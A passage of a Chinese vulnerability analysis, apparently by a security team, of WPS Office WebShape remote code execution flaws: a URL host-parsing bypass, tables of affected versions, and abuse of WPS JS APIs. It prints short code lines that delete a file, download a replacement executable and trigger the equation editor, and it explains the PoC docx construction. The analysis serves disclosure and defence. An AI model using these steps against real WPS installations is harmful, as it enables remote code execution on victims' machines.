 文件的匹配项被删除后，还可以利用 url 绕过结合 kwebextensionlist.cfg  
 文件 EXTSOURCE  
 节下 trustedHosts  
 键的键值，达到任意网页自动访问的攻击效果。  
  
访问页面后再利用 WPS 自带的 JS API 中的功能实现特定路径文件的删除、下载和运行。  
### 1. url 绕过  
  
在 KxWebExtensionView::delayShow  
 中，进行域名判断的时候，利用的是函数 QUrl::host  
 提取 host，然后进行判断。但是在特殊构造的 url 下，会提取出和浏览器解析结果不同的 host。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT3iahqCkYYjmw1gI9aGgwgAAgVowVACazpUhUe2NZRNILGBh9Xt3Pia9dLicYcZVkSSTLZ3zRWDawFrA/640?wx_fmt=png "")  
  
因此 WPS 在处理访问控制的时候使用的是伪造的 host 进行判断，从而导致 url 绕过。  
### 2. url 绕过版本测试  
<table><thead><tr><th style="padding: 8px;text-align: left;line-height: 20px;vertical-align: top;border-top: 0px;border-right-color: rgb(239, 239, 239);border-bottom-color: rgb(239, 239, 239);border-left-color: rgb(239, 239, 239);color: rgb(0, 0, 0);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">WPS 版本号</span></th><th style="padding: 8px;text-align: left;line-height: 20px;vertical-align: top;border-top: 0px;border-right-color: rgb(239, 239, 239);border-bottom-color: rgb(239, 239, 239);border-left-color: rgb(239, 239, 239);color: rgb(0, 0, 0);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">能否绕过</span></th><th style="padding: 8px;text-align: left;line-height: 20px;vertical-align: top;border-top: 0px;border-right-color: rgb(239, 239, 239);border-bottom-color: rgb(239, 239, 239);border-left-color: rgb(239, 239, 239);color: rgb(0, 0, 0);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">该版本安装包签名时间</span></th></tr></thead><tbody><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">11.1.0.11365</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">能</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2022年3月1日</span></td></tr><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">11.1.0.12300</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">能</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2022年8月2日</span></td></tr><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">11.1.0.12313</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">能</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2022年8月15日</span></td></tr><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">11.1.0.13703</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">能</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2023年3月1日</span></td></tr><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">11.1.0.14309</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">能</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2023年4月27日</span></td></tr><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">12.1.0.15120</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">能</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2023年7月13日</span></td></tr><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">12.1.0.15324</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">能</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2023年8月9日</span></td></tr><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">12.1.0.15374</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">否</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2023年8月28日</span></td></tr></tbody></table>  
在 12.1.0.15374 版本该 url 绕过已被修复，在该版本的访问控制函数 KxWebExtensionOsrNotify::show  
 中，选择添加一个 QUrl::isValid  
 函数判断 url 是否合规。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT3iahqCkYYjmw1gI9aGgwgAAicA9pkGWMq7VqUvBpwBBt8ocUmbWXqHZw79Fia7gkn6gH0DvUnFic5AeQ/640?wx_fmt=png "")  
### 3. WPS JS API 利用  
  
根据网上信息的截图和介绍可以知道，攻击者利用 wps.Office.UploadFileToServer API删除了本地的公式编辑器 Eqnedit.exe ，再使用 window.wps.Office.DownloadFileFromServer API下载了恶意样本并保存为公式编辑器，最后通过某些API触发了公式编辑器的调用。  
  
经过对 jswpsapi.dll 的逆向，wps.Office.UploadFileToServer 在上传文件结束后，会获取第三个参数中 bDelLocalFile 的值，如果为true，则会删除原文件。  
```
wps.Office.UploadFileToServer("http://127.0.0.1/",filepath,"{\"bDelLocalFile\":true}")
```  
  
wps.Office.UploadFileToServer 可以下载文件，但无法覆盖已存在文件。这也是前面删除文件的意义。  
```
window.wps.Office.DownloadFileFromServer("http://127.0.0.1/download.exe", filepath);
```  
  
由于 WPS 的 JS API实现的功能和 VBA 的类似，所以在未找到 WPS API相关文档的情况下，参照 OLEFormat.Edit method文档最终构造出触发 OLE公式编辑的请求：  
```
# 需要文档开头包含一个 OLE 格式的公式，如果不在开头，则需要修改 Item 的值wps.ActiveDocument.InlineShapes.Item(1).OLEFormat.Edit()
```  
  
在 11.1.0.12313 的复现截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT3iahqCkYYjmw1gI9aGgwgAAsxGfcMialgUsicpQqjZHu7Dh1SHcDhN0Nwvy2CG3m8TKvR8Ql0TzFnjw/640?wx_fmt=png "")  
### 4. WPS JS API 利用版本测试  
  
****<table><thead><tr><th style="padding: 8px;text-align: left;line-height: 20px;vertical-align: top;border-top: 0px;border-right-color: rgb(239, 239, 239);border-bottom-color: rgb(239, 239, 239);border-left-color: rgb(239, 239, 239);color: rgb(0, 0, 0);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">WPS 版本号</span></th><th style="padding: 8px;text-align: left;line-height: 20px;vertical-align: top;border-top: 0px;border-right-color: rgb(239, 239, 239);border-bottom-color: rgb(239, 239, 239);border-left-color: rgb(239, 239, 239);color: rgb(0, 0, 0);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">是否复现</span></th><th style="padding: 8px;text-align: left;line-height: 20px;vertical-align: top;border-top: 0px;border-right-color: rgb(239, 239, 239);border-bottom-color: rgb(239, 239, 239);border-left-color: rgb(239, 239, 239);color: rgb(0, 0, 0);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">该版本安装包签名时间</span></th></tr></thead><tbody><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">11.1.0.11365</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">能</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2022年3月1日</span></td></tr><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">11.1.0.12300</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">能</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2022年8月2日</span></td></tr><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">11.1.0.12313</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">能</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2022年8月15日</span></td></tr><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">11.1.0.13703</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">能</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2023年3月1日</span></td></tr><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">11.1.0.14309</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">能</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2023年4月27日</span></td></tr><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">12.1.0.15120</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">能</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2023年7月13日</span></td></tr><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">12.1.0.15324</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">能</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2023年8月9日</span></td></tr><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">12.1.0.15374</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">能</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2023年8月28日</span></td></tr></tbody></table>  
  
**6. Q&A**  
  
  
### 1. 样本 docx 中出现的小图片是什么  
  
我们注意到公开以 WebShape 漏洞为入口点的攻击样本中，docx 文件都会有一个小图片。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT3iahqCkYYjmw1gI9aGgwgAAwpK9D6Pv3uJed91TiaiaLqic5yEqbbaib3ApF3PibCAEChgg5uFYKXVsc9w/640?wx_fmt=png "")  
  
它到底是什么？以 GitHub 上公开的项目 ba0gu0/wps-rce 中对 PoC_docx 的构造可知该图片来源于 PoC_docx\word\media\image.png  
。  
  
通过修改 PoC_docx\word\_rels\document.xml.rels  
 文件和 PoC_docx\word\document.xml  
 文件把 image 图片和 webExtension1.xml 文件绑定起来，构造成浏览器对象 WebShape，拉起 WPS web 组件，才有后续的任意网页访问。  
  
并且复制这个小图片到新的 docx 文档，docx\word\_rels\document.xml.rels  
 文件和 docx\word\document.xml  
 文件会被自动修改，image 图片和 webExtension1.xml 文件也会被拷贝到对应位置，所以在新的 docx 文档也能实现攻击行为。  
  
通过代码查询该对象。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT3iahqCkYYjmw1gI9aGgwgAAUqoicx7hvZlU0jb9jicYicOfm8Y6TNia6NMemZ724j7tcicc7hRtRRh5YlA/640?wx_fmt=png "")  
### 2. 在 Chrome 历史漏洞的攻击事件中，同一 url 能无网络连接重复复现成功  
  
由于是 Chrome 的历史漏洞，Chrome 作为浏览器对网页有缓存，因此同一 url 能在初次复现成功后无需网络连接重复复现。  
  
缓存文件为 %APPDATA%\kingsoft\wps\addons\data\win-i386\cef\globalcache\wps\Cache  
 目录下的 data_3  
 文件。  
  
**7. 总结**  
  
最近几年因为大型攻防演练的原因，更多的国产化流行软件成为漏洞挖掘的主要目标，其中对于这种桌面应用程序调用浏览器来处理 URL 是主要的攻击面之一，从今年 WPS 的这几个漏洞基本都是围绕 WPS WebShape 展开，通过上面的分析我们可以把相关的关键漏洞点总结如下模型：  
  
**1.处理 URL 不当**  
  
对 URL 的理解及 host 等关键点提取识别判断标准不一致导致各种绕过，这个问题实际上普遍存在于各种对 URL 场景中，甚至还包括一些语言函数提取的标准不一致导致的安全问题等等。  
  
**2.内部 API 暴露调用**  
  
这也属于应用程序调用浏览器内核的经典漏洞模型，在 2013 年的 KCon 黑哥的议题《去年跨过的浏览器》介绍了很多国产浏览器上 API 的问题，当然这类漏洞在后面移动及各种桌面应用都存在这类经典问题，这类问题核心在于 API 的调用权限取决于 “特权域”（“信任域”），比如在这次 WPS 中其实上面 “URL” 的处理实际上就在控制这点。在其他经典案例里实际上就算完美处理 URL 里域判断问题，也还是有可能导致安全问题的，比如攻击者可以通过寻找信任域网站下面的 XSS 等实现调用这些 API 达到攻击的目的。  
  
**3.外部第三方供应链漏洞**  
  
现在大部分的应用程序处理网页习惯的应用都不是调用默认的系统浏览器，而是直接打包一个第三方阉割版的浏览器内核，所以这个就产生了非常经典的第三方供应链漏洞，比如本文第二次 WPS 就是直接复用了 Chrome 历史漏洞 CVE-2022-1364，这种问题在往年的大型演练里也出现过比如微信、钉钉等，在 2022 年 KCon 上 avboy1337 的议题《ChromePatchGap在亿级用户量IM中的漏洞利用》就提到了很多的案例。  
  
**8.  参考链接**  
  
1.[WPS Office远程代码执行复现与分析？](https://mp.weixin.qq.com/s?__biz=Mzg3NDk1MDczOQ==&mid=2247484340&idx=1&sn=982d76b8a62f09bf14f53012a46ffe8e&chksm=cec9ba88f9be339ee1ceea131362e5daa801ad15a913913b9bf587198aed93cef17885365476&scene=21#wechat_redirect)  
  
  
2. [ 漏洞学习 | 2023HW 0day WPS-Office RCE 复现与分析（文末附最新POC）](https://mp.weixin.qq.com/s?__biz=Mzk0MTQzNjIyNg==&mid=2247485802&idx=1&sn=298e11410165dbd54c979acf47c5cea3&chksm=c2d33547f5a4bc51075e5f77c5ac55286f591d4a00ce7b1af62928fa03762b16f334109d1812&scene=21#wechat_redirect)  
  
  
3.  [WPS未知漏洞利用，安恒云沙箱可检测](https://mp.weixin.qq.com/s?__biz=MzUyMDEyNTkwNA==&mid=2247495145&idx=1&sn=3e4ed22d1620ad869014183ac34c6962&scene=21#wechat_redirect)  
  
  
4. [演讲议题巡展｜ChromePatchGap在亿级用户量IM中的漏洞利用](https://mp.weixin.qq.com/s?__biz=MzIzOTAwNzc1OQ==&mid=2651135399&idx=1&sn=a1a29092af4eea237b5e6a049204de0a&scene=21#wechat_redirect)  
  
  
5. https://security.wps.cn/notices/35   
  
6.  https://paper.seebug.org/1821/  
  
7.  https://github.com/ba0gu0/wps-rce  
  
8.  https://zhuanlan.zhihu.com/p/240406641  
  
9.  https://learn.microsoft.com/en-us/office/vba/api/word.oleformat.edit  
  
10. https://github.com/knownsec/KCon/tree/master/2013/%E5%8E%BB%E5%B9%B4%E8%B7%A8%E8%BF%87%E7%9A%84%E6%B5%8F%E8%A7%88%E5%99%A8  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT0mSRTxbY7fsoLUFViaxk1nhQByibgTdbwbMqNibWMKbHKrjwUUY8GNZlAoUlcic5ibVhyCebVwoNialnow/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "404 logo-b04.png")  
  
  
**作者名片******  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/3k9IT3oQhT3iahqCkYYjmw1gI9aGgwgAA0hR54FWvqI4BoU1AmThH0gqialuaBrBziaujShBx6qQmdibZI31rl1l2g/640?wx_fmt=jpeg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/3k9IT3oQhT0Z79Hq9GCticVica4ufkjk5xiarRicG97E3oEcibNSrgdGSsdicWibkc8ycazhQiaA81j3o0cvzR5x4kRIcQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
**往 期 热 门******  
  
(点击图片跳转）  
  
  
[](http://mp.weixin.qq.com/s?__biz=MzAxNDY2MTQ2OQ==&mid=2650972561&idx=1&sn=fb064eb15ec861743d048458dedd5823&chksm=8079e3a3b70e6ab5f3bdb69aec2e003932a8cf35196f0f841dfca05a575940f37a6cc2909510&scene=21#wechat_redirect)  
  
[](http://mp.weixin.qq.com/s?__biz=MzAxNDY2MTQ2OQ==&mid=2650973143&idx=1&sn=9ac214cb2e34e16e28940b1b2a84cbd3&chksm=8079e1e5b70e68f306e34893bbacafb61a9ba8ff57045b639641791fa4d93b4c79f8ad9f03ff&scene=21#wechat_redirect)  
  
[](http://mp.weixin.qq.com/s?__biz=MzAxNDY2MTQ2OQ==&mid=2650971286&idx=2&sn=3efd04034b472f8035807d2e60c07a66&chksm=8079dea4b70e57b2d17486ca7493a522d9f69cb1a774f883b61b021cc90e4e9199379fd9ba2a&scene=21#wechat_redirect)  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/3k9IT3oQhT3XlD8Odz1EaR5icjZWy3jb8ZZPdfjQiakDHOiclbpjhvaR2icn265LYMpu3CmR1GoX707tWhAVsMJrrQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
戳  
“阅读原文”  
更多精彩内容!  
  
  
